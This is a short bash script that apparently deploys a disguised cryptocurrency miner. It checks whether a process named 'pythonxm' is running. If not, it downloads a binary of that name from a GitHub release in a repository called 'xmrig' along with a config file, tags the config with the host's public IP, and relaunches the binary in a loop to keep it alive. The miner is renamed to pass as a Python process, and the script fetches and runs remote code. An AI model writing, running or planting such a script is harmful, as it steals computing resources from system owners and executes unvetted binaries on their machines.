#!bin/bash -xe 
echo '#### Version 0.0.7 ####'
if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
then 
echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
# info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl -s ipinfo.io

# Cleaner
rm -rf pythonxm
rm -rf config.json
rm -rf x.out



# Prepare
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+$IPNAME+g" config.json


./pythonxm -c config.json 

while [ $(ps -aux |grep pythonxm |wc -l) -le 1 ] 
  do
  echo '######### execution #########'
  ./pythonxm -c config.json
  done

else 

echo "It's ok : $(ps -aux |grep pythonxm |wc -l)"; 
  tail -f x.out
fi
